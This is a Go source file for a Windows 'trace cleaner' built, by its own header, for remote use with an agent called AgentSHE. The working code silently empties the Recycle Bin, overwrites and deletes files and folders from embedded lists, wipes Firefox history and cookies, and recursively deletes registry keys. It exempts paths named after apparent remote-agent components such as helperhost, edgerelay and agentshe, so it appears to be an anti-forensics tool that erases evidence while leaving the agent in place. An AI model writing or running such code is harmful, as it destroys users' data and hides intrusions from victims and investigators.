// Cleaner — Windows trace cleaner (zero deps).
// Path lists adapted from https://github.com/loxy0devlp/Cleaner (MIT, loxy0devlp).
// Built as a single static EXE for AgentSHE remote use.
package main

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"syscall"

	_ "embed"

	"golang.org/x/sys/windows/registry"
)

//go:embed paths/WindowsFilePaths.json
var filesJSON []byte

//go:embed paths/WindowsFolderPaths.json
var foldersJSON []byte

//go:embed paths/WindowsRegistryKeys.json
var registryJSON []byte

var (
	deleted  int
	skipped  int
	failed   int
	envLocal string
	envRoam  string
	envUser  string
	envRoot  string
	envProg  string
	envTemp  string
)

func main() {
	envLocal = os.Getenv("LOCALAPPDATA")
	envRoam = os.Getenv("APPDATA")
	envUser = os.Getenv("USERPROFILE")
	envRoot = os.Getenv("SystemRoot")
	envProg = os.Getenv("ProgramData")
	envTemp = os.Getenv("TEMP")
	if envTemp == "" {
		envTemp = os.Getenv("TMP")
	}

	fmt.Println("CLEANER start")
	emptyRecycleBin()
	cleanFirefox()
	runFilePaths()
	runFolderPaths()
	runRegistryKeys()
	fmt.Printf("CLEANER done deleted=%d skipped=%d failed=%d\n", deleted, skipped, failed)
}

func expandParts(parts []string) string {
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.ReplaceAll(p, "%PATH_APPDATA_LOCAL%", envLocal)
		p = strings.ReplaceAll(p, "%PATH_APPDATA_ROAMING%", envRoam)
		p = strings.ReplaceAll(p, "%PATH_USER%", envUser)
		p = strings.ReplaceAll(p, "%PATH_SYSTEM_ROOT%", envRoot)
		p = strings.ReplaceAll(p, "%PATH_PROGRAM_DATA%", envProg)
		p = strings.ReplaceAll(p, "%PATH_TOR%", "") // Tor optional — empty skips
		if p == "" {
			continue
		}
		out = append(out, p)
	}
	if len(out) == 0 {
		return ""
	}
	return filepath.Join(out...)
}

func isProtected(path string) bool {
	low := strings.ToLower(filepath.Clean(path))
	markers := []string{
		`\helperhost`,
		`\helperhostcache`,
		`edgerelay`,
		`dcontrol`,
		`agentshe`,
		`cleaner.exe`,
	}
	for _, m := range markers {
		if strings.Contains(low, m) {
			return true
		}
	}
	// Protect HelperHostCache under any TEMP
	base := strings.ToLower(filepath.Base(low))
	if base == "helperhostcache" || base == "helperhost" {
		return true
	}
	return false
}

func overwriteFile(path string) error {
	fi, err := os.Stat(path)
	if err != nil {
		return err
	}
	if fi.IsDir() {
		return fmt.Errorf("is dir")
	}
	size := fi.Size()
	if size <= 0 {
		return nil
	}
	// Cap overwrite work for huge files (still truncate+remove)
	const maxWipe = 64 << 20 // 64 MiB
	wipe := size
	if wipe > maxWipe {
		wipe = maxWipe
	}
	f, err := os.OpenFile(path, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	buf := make([]byte, 64*1024)
	var written int64
	for written < wipe {
		n := len(buf)
		if int64(n) > wipe-written {
			n = int(wipe - written)
		}
		nn, err := f.Write(buf[:n])
		written += int64(nn)
		if err != nil {
			return err
		}
	}
	_ = f.Truncate(size)
	return f.Sync()
}

func deleteFile(category, path string) {
	matches, err := filepath.Glob(path)
	if err != nil || len(matches) == 0 {
		// Glob may fail on literal path without meta — try as-is
		if _, e := os.Stat(path); e == nil {
			matches = []string{path}
		} else {
			return
		}
	}
	for _, m := range matches {
		if isProtected(m) {
			skipped++
			fmt.Printf("SKIP file (%s): %s\n", category, m)
			continue
		}
		_ = overwriteFile(m)
		if err := os.Remove(m); err != nil {
			failed++
			fmt.Printf("FAIL file (%s): %s (%v)\n", category, m, err)
			continue
		}
		deleted++
		fmt.Printf("OK file (%s): %s\n", category, m)
	}
}

func deleteFolderContents(category, folder string) {
	if folder == "" {
		return
	}
	if isProtected(folder) {
		skipped++
		fmt.Printf("SKIP folder (%s): %s\n", category, folder)
		return
	}
	st, err := os.Stat(folder)
	if err != nil || !st.IsDir() {
		return
	}
	entries, err := os.ReadDir(folder)
	if err != nil {
		failed++
		return
	}
	for _, e := range entries {
		full := filepath.Join(folder, e.Name())
		if isProtected(full) {
			skipped++
			fmt.Printf("SKIP (%s): %s\n", category, full)
			continue
		}
		if e.IsDir() {
			deleteTree(category, full)
		} else {
			deleteFile(category, full)
		}
	}
}

func deleteTree(category, folder string) {
	if isProtected(folder) {
		skipped++
		return
	}
	_ = filepath.WalkDir(folder, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if isProtected(path) {
			skipped++
			if d.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}
		if d.IsDir() {
			return nil
		}
		_ = overwriteFile(path)
		if e := os.Remove(path); e != nil {
			failed++
		} else {
			deleted++
		}
		return nil
	})
	// remove empty dirs bottom-up
	_ = filepath.WalkDir(folder, func(path string, d fs.DirEntry, err error) error {
		if err != nil || !d.IsDir() || path == folder {
			return nil
		}
		if isProtected(path) {
			return filepath.SkipDir
		}
		_ = os.Remove(path)
		return nil
	})
	if err := os.RemoveAll(folder); err != nil {
		// may fail if protected children remain — OK
		fmt.Printf("WARN rmdir (%s): %s (%v)\n", category, folder, err)
	} else {
		deleted++
		fmt.Printf("OK folder (%s): %s\n", category, folder)
	}
}

func runFilePaths() {
	var data map[string][][]string
	if err := json.Unmarshal(filesJSON, &data); err != nil {
		fmt.Println("FAIL parse files json:", err)
		return
	}
	for cat, paths := range data {
		for _, parts := range paths {
			p := expandParts(parts)
			if p == "" || strings.Contains(p, "%PATH_TOR%") {
				continue
			}
			deleteFile(cat, p)
		}
	}
}

func runFolderPaths() {
	var data map[string][][]string
	if err := json.Unmarshal(foldersJSON, &data); err != nil {
		fmt.Println("FAIL parse folders json:", err)
		return
	}
	for cat, paths := range data {
		for _, parts := range paths {
			p := expandParts(parts)
			if p == "" {
				continue
			}
			// expand simple * segments in path (e.g. Microsoft.WindowsTerminal_*)
			matches := expandGlobs(p)
			for _, m := range matches {
				deleteFolderContents(cat, m)
			}
		}
	}
}

func expandGlobs(path string) []string {
	if !strings.Contains(path, "*") {
		return []string{path}
	}
	matches, err := filepath.Glob(path)
	if err != nil || len(matches) == 0 {
		return nil
	}
	return matches
}

func runRegistryKeys() {
	var data map[string][]string
	if err := json.Unmarshal(registryJSON, &data); err != nil {
		fmt.Println("FAIL parse registry json:", err)
		return
	}
	for cat, keys := range data {
		for _, k := range keys {
			if err := deleteRegKey(k); err != nil {
				failed++
				fmt.Printf("FAIL reg (%s): %s (%v)\n", cat, k, err)
			} else {
				deleted++
				fmt.Printf("OK reg (%s): %s\n", cat, k)
			}
		}
	}
}

func deleteRegKey(full string) error {
	full = strings.TrimSpace(full)
	i := strings.Index(full, `\`)
	if i < 0 {
		return fmt.Errorf("bad key")
	}
	rootName := strings.ToUpper(full[:i])
	sub := full[i+1:]
	var root registry.Key
	switch rootName {
	case "HKEY_CURRENT_USER", "HKCU":
		root = registry.CURRENT_USER
	case "HKEY_LOCAL_MACHINE", "HKLM":
		root = registry.LOCAL_MACHINE
	case "HKEY_CLASSES_ROOT", "HKCR":
		root = registry.CLASSES_ROOT
	case "HKEY_USERS", "HKU":
		root = registry.USERS
	case "HKEY_CURRENT_CONFIG", "HKCC":
		root = registry.CURRENT_CONFIG
	default:
		return fmt.Errorf("unknown root")
	}
	// Never touch HelperHost registry
	if strings.Contains(strings.ToLower(sub), `software\helperhost`) {
		skipped++
		return nil
	}
	return deleteKeyRecursive(root, sub)
}

func deleteKeyRecursive(root registry.Key, path string) error {
	k, err := registry.OpenKey(root, path, registry.READ|registry.WRITE)
	if err != nil {
		// already gone
		return nil
	}
	names, _ := k.ReadSubKeyNames(-1)
	_ = k.Close()
	for _, n := range names {
		_ = deleteKeyRecursive(root, path+`\`+n)
	}
	return registry.DeleteKey(root, path)
}

func cleanFirefox() {
	bases := []string{
		filepath.Join(envRoam, "Mozilla", "Firefox", "Profiles"),
		filepath.Join(envLocal, "Mozilla", "Firefox", "Profiles"),
	}
	targets := []string{
		"places.sqlite", "formhistory.sqlite", "permissions.sqlite",
		"content-prefs.sqlite", "cookies.sqlite", "cookies.sqlite-wal",
		"cache", "cache1", "cache2", "cache3", "storage",
	}
	for _, base := range bases {
		ents, err := os.ReadDir(base)
		if err != nil {
			continue
		}
		for _, e := range ents {
			if !e.IsDir() || !strings.Contains(e.Name(), ".default") {
				continue
			}
			prof := filepath.Join(base, e.Name())
			for _, t := range targets {
				p := filepath.Join(prof, t)
				st, err := os.Stat(p)
				if err != nil {
					continue
				}
				if st.IsDir() {
					deleteTree("Firefox", p)
				} else {
					deleteFile("Firefox", p)
				}
			}
		}
	}
}

func emptyRecycleBin() {
	shell32 := syscall.NewLazyDLL("shell32.dll")
	proc := shell32.NewProc("SHEmptyRecycleBinW")
	const (
		SHERB_NOCONFIRMATION = 0x00000001
		SHERB_NOPROGRESSUI   = 0x00000002
		SHERB_NOSOUND        = 0x00000004
	)
	flags := uintptr(SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND)
	r, _, _ := proc.Call(0, 0, flags)
	_ = r
	// Also wipe $Recycle.Bin on fixed drives A-Z
	for c := 'A'; c <= 'Z'; c++ {
		p := fmt.Sprintf(`%c:\$Recycle.Bin`, c)
		if st, err := os.Stat(p); err == nil && st.IsDir() {
			deleteFolderContents("Trash", p)
		}
	}
	fmt.Println("OK recycle bin")
}
